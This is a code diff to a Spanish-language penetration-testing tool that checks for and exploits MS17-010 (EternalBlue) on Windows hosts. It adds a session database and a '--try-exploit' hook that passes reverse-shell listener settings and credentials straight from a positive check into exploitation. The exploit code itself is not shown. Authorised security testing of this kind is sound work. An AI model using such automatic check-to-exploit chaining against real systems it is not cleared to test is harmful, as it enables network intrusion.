@@ -1029,6 +1029,8 @@ def run_check(target, port, timeout):
         console.print(f"  [yellow]? No se pudo determinar[/yellow] — sin respuesta o puerto cerrado")
         console.print(f"  [dim]Comprueba que el puerto {port} esté abierto y SMBv1 activo[/dim]")
 
+    return result is True
+
 
 def run_exploit(target, port, payload, cmd, lhost, lport, timeout, user='', password='', domain=''):
     console.print(f"\n  [bold red]MS17-010 — EternalBlue exploit[/bold red]")
@@ -1090,6 +1092,7 @@ def _build_ps_reverse_shell(lhost: str, lport: int) -> str:
 
 def build_parser():
     import argparse
+    from core.hooks import add_args_try_exploit
     parser = argparse.ArgumentParser(
         prog="lobera-check",
         description="Comprobación y explotación de vulnerabilidades en entornos Windows/AD",
@@ -1108,6 +1111,7 @@ def build_parser():
     p.add_argument("-u", "--user",     default="", help="Usuario SMB (vacío = sesión nula)")
     p.add_argument("-p", "--password", default="", help="Contraseña SMB")
     p.add_argument("-d", "--domain",   default="", help="Dominio")
+    add_args_try_exploit(p)
     return parser
 
 
@@ -1135,6 +1139,9 @@ def _banner():
 
 
 def main():
+    from core.session_db import init_db
+    init_db()
+
     parser = build_parser()
     args = parser.parse_args()
 
@@ -1146,8 +1153,31 @@ def main():
     if args.vuln == "ms17010":
         if args.modo == "exploit":
             _banner()
+
         if args.modo == "check":
-            run_check(args.target, args.port, args.timeout)
+            es_vulnerable = run_check(args.target, args.port, args.timeout)
+
+            # Guardar resultado en BD y disparar hook --try-exploit si procede
+            if es_vulnerable:
+                from core.hooks import on_vuln_encontrada
+                lhost = getattr(args, 'lhost', None)
+                lport = getattr(args, 'lport', 4444)
+                on_vuln_encontrada(
+                    target_ip=args.target,
+                    vuln_id='MS17-010',
+                    descripcion='EternalBlue — SMBv1 buffer overflow (CVE-2017-0144)',
+                    port=args.port,
+                    protocol='smb',
+                    try_exploit=getattr(args, 'try_exploit', False),
+                    exploit_opts={
+                        'payload': getattr(args, 'payload', 'cmd'),
+                        'lhost': lhost or '',
+                        'lport': lport,
+                        'user': getattr(args, 'user', ''),
+                        'password': getattr(args, 'password', ''),
+                        'domain': getattr(args, 'domain', ''),
+                    },
+                )
         else:
             run_exploit(args.target, args.port,
                         args.payload, args.cmd,
